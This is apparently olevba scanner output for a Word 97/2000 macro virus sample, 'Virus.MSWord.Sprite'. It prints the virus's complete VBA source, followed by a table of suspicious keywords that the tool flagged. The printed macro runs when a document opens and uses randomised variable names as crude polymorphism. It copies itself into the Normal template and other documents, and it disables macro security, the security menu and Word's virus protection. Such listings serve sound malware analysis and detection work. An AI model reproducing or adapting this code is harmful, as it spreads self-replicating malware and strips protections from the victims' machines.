olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sprite
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sprite - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
Private Sub Document_Open()
 On Error Resume Next
 Dim norm As Variant, code(21) As String
 Dim doc As Variant, bug As Variant
 norm = "c" & Int((Rnd * 1000) + 2)
 doc = "d" & Int((Rnd * 1000) + 2)
 bug = "b" & Int((Rnd * 1000) + 2)
 code(1) = "Set " & norm & " = NormalTemplate.VBProject.VBComponents(1).CodeModule"
 code(2) = "Set " & doc & " = ActiveDocument.VBProject.VBComponents(1).CodeModule"
 code(3) = "Set " & bug & " = new dataobject"
 code(4) = "If " & norm & ".lines(1, 1) <> ""'"" Then"
 code(5) = "With " & norm
 code(6) = ".DeleteLines 1, .CountOfLines"
 code(7) = "End With"
 code(8) = bug & ".SetText " & doc & ".lines(1, " & doc & ".CountOfLines): " & norm & ".InsertLines 1, " & bug & ".GetText(1)"
 code(9) = "End If"
 code(10) = "If " & doc & ".lines(1, 1) <> ""'"" Then"
 code(11) = "With " & doc
 code(12) = ".DeleteLines 1, .CountOfLines"
 code(13) = "End With"
 code(14) = bug & ".SetText " & norm & ".lines(1, " & norm & ".CountOfLines): " & doc & ".InsertLines 1, " & bug & ".GetText(1)"
 code(15) = "End if"
 code(16) = "" & norm & ".DeleteLines 34, 21"
 code(17) = "" & doc & ".DeleteLines 34, 21"
 code(18) = "If System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") <> """" Then: CommandBars(""Macro"").Controls(""Security..."").Enabled = 0: System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"
 code(19) = "Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0: Options.VirusProtection = 0"
 code(20) = "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument"
 For x = 1 To 20: codevx = codevx & code(x) & vbCr: Next x
  ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 34, codevx
 Call Sprite
End Sub
Private Sub Sprite(): On Error Resume Next
End Sub
' Word 97/2k.Sprite
' Psyclone X
' My first try at POLYMORPHISM (If it could even be called that)
' I know it sucks but it'll get better

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

